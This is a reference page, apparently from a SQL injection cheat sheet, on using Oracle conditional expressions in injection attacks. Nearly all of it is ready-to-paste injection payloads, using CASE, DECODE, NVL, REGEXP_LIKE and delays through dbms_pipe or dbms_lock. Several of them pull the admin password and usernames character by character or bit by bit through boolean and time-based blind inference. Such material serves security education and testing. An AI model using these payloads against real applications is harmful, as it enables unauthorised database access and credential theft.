---
title: Conditional Statements
description: Using Oracle conditional expressions for SQL injection attacks
category: Injection Techniques
order: 10
tags: ["conditional", "boolean", "case", "decode"]
lastUpdated: 2025-03-15
---

## Conditional Statements

Conditional statements are fundamental for extracting information from Oracle databases, especially in blind SQL injection scenarios. Oracle provides several methods for implementing conditional logic, which can be leveraged to infer data even when direct output is not available.

### Basic Conditional Operators

Oracle supports standard conditional operators and expressions:

| Expression | Description | Example |
|------------|-------------|---------|
| `CASE` | Evaluates conditions and returns values | `CASE WHEN condition THEN result1 ELSE result2 END` |
| `DECODE` | Compares expressions and returns matching value | `DECODE(expression, search1, result1, search2, result2, default)` |
| `IF-THEN-ELSE` | PL/SQL conditional logic | `IF condition THEN action1; ELSE action2; END IF;` |
| `AND`, `OR`, `NOT` | Logical operators | `condition1 AND condition2` |

### Boolean-Based Injection

Boolean-based injection uses true/false conditions to extract information character by character:

```sql
-- Basic boolean condition
' OR 1=1--

-- More specific condition
' OR (SELECT COUNT(*) FROM users)>0--

-- Testing if admin user exists
' OR EXISTS(SELECT 1 FROM users WHERE username='admin')--
```

### CASE Expressions

The CASE statement provides powerful conditional logic:

```sql
-- Simple CASE expression
' OR (CASE WHEN (SELECT COUNT(*) FROM users)>0 THEN 1 ELSE 0 END)=1--

-- Character-by-character extraction
' OR (CASE WHEN SUBSTR((SELECT password FROM users WHERE username='admin'),1,1)='a' THEN 1 ELSE 0 END)=1--

-- Numeric comparison
' OR (CASE WHEN (SELECT ASCII(SUBSTR(username,1,1)) FROM users WHERE rownum=1)=97 THEN 1 ELSE 0 END)=1--
```

### DECODE Function

DECODE is Oracle's proprietary conditional function:

```sql
-- Simple DECODE usage
' OR DECODE((SELECT COUNT(*) FROM users),0,0,1)=1--

-- Character testing with DECODE
' OR DECODE(SUBSTR((SELECT username FROM users WHERE rownum=1),1,1),'a',1,0)=1--

-- Multiple condition checking
' OR DECODE(SUBSTR((SELECT username FROM users WHERE rownum=1),1,1),'a',1,'b',1,'c',1,0)=1--
```

### Combining with Time Delays

Conditional expressions become particularly useful when combined with time delays in blind scenarios:

```sql
-- Time delay triggered on condition
' AND (CASE WHEN (SELECT COUNT(*) FROM users)>0 THEN dbms_pipe.receive_message('x',10) ELSE NULL END) IS NULL--

-- Extract data with time-based feedback
' AND (CASE WHEN ASCII(SUBSTR((SELECT username FROM users WHERE rownum=1),1,1))=97 THEN dbms_pipe.receive_message('x',10) ELSE NULL END) IS NULL--
```

### SQL Injection Examples

#### Boolean Blind Extraction

```sql
-- Testing each bit of a character (faster than testing each possible ASCII value)
' OR (ASCII(SUBSTR((SELECT username FROM users WHERE rownum=1),1,1)) & 1)=1--
' OR (ASCII(SUBSTR((SELECT username FROM users WHERE rownum=1),1,1)) & 2)=2--
' OR (ASCII(SUBSTR((SELECT username FROM users WHERE rownum=1),1,1)) & 4)=4--
```

#### Time-Based Blind Extraction

```sql
-- Using dbms_pipe.receive_message
' AND (CASE WHEN SUBSTR((SELECT username FROM users WHERE rownum=1),1,1)='a' THEN dbms_pipe.receive_message('x',10) ELSE NULL END) IS NULL--

-- Using alternative delay function (dbms_lock.sleep)
' AND (CASE WHEN (SELECT COUNT(*) FROM users)>0 THEN dbms_lock.sleep(10) ELSE dbms_lock.sleep(0) END)=0--
```

#### Inferring Multiple Bits

```sql
-- Testing multiple bits at once
' OR (CASE WHEN (ASCII(SUBSTR((SELECT username FROM users WHERE rownum=1),1,1)) BETWEEN 97 AND 122) THEN 1 ELSE 0 END)=1--
```

### Advanced Techniques

#### Using Regular Expressions

Oracle's regular expression support can be combined with conditionals:

```sql
-- Using REGEXP_LIKE
' OR (CASE WHEN REGEXP_LIKE((SELECT username FROM users WHERE rownum=1),'^a') THEN 1 ELSE 0 END)=1--

-- Get pattern matches
' OR (CASE WHEN REGEXP_LIKE((SELECT username FROM users WHERE rownum=1),'^[a-d]') THEN 1 ELSE 0 END)=1--
```

#### Using NVL and NULLIF

```sql
-- NVL for handling NULL values
' OR NVL((CASE WHEN (SELECT COUNT(*) FROM users)>0 THEN 1 END),0)=1--

-- NULLIF for comparison
' OR NULLIF((SELECT COUNT(*) FROM users),0) IS NOT NULL--
```

#### Conditional Subqueries

```sql
-- Condition in subquery
' OR EXISTS(SELECT 1 FROM users WHERE ASCII(SUBSTR(username,1,1))=97)--

-- ALL and ANY operators
' OR 97 = ANY(SELECT ASCII(SUBSTR(username,1,1)) FROM users)--
```

### Multi-Condition Tests

```sql
-- Testing multiple conditions
' OR (CASE 
    WHEN (SELECT COUNT(*) FROM users)>0 AND 
         (SELECT COUNT(*) FROM user_tables)>10 AND
         (SELECT username FROM users WHERE rownum=1) LIKE 'a%'
    THEN 1 ELSE 0 END)=1--
```

### Error Handling in Conditionals

```sql
-- Using exception handling with conditions
' OR (CASE WHEN (SELECT 1 FROM dual WHERE EXISTS(SELECT 1 FROM users WHERE username='admin'))=1 THEN 1 ELSE 1/0 END)=1--
```

